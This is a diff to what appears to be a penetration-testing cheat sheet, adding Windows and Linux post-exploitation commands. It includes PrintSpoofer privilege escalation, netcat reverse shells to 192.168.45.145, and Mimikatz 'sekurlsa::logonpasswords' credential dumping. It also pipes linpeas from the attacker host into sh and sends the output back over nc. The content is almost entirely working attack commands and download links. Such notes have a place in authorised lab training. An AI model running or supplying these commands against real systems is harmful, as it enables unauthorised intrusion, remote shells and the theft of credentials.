@@ -61,19 +61,23 @@ https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
 
 # Windows
 
-PrintSpoofer
+PrintSpoofer (Abusing `SeImpersonatePrivilege`)
 
-```
+https://github.com/itm4n/PrintSpoofer
+
+```powershell
 https://github.com/itm4n/PrintSpoofer/releases
 # Usage 1 - Spawning cmd interactive as system
-.\PrintSpoofer64.exe -i -c cmd
+PrintSpoofer64.exe -i -c cmd
 # Usage 2 - Launching reverse shell as system
-.\PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
+PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
 ```
 
 NC
 
-```
+https://github.com/int0x33/nc.exe/
+
+```powershell
 https://github.com/int0x33/nc.exe/
 # nc64.exe
 https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
@@ -82,8 +86,23 @@ nc64.exe 192.168.45.145 9001 -e powershell
 ```
 
 Mimikatz
-```
+
+https://github.com/ParrotSec/mimikatz
+
+```powershell
 https://raw.githubusercontent.com/ParrotSec/mimikatz/refs/heads/master/x64/mimikatz.exe
+# Usage
+privilege::debug
+sekurlsa::logonpasswords full
+```
+
+# Linux
+
+```powershell
+https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+# Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out # attacker
+curl http://192.168.45.145/linpeas.sh | sh | nc 192.168.45.145 9002 # victim
 ```
 
 # Tunneling
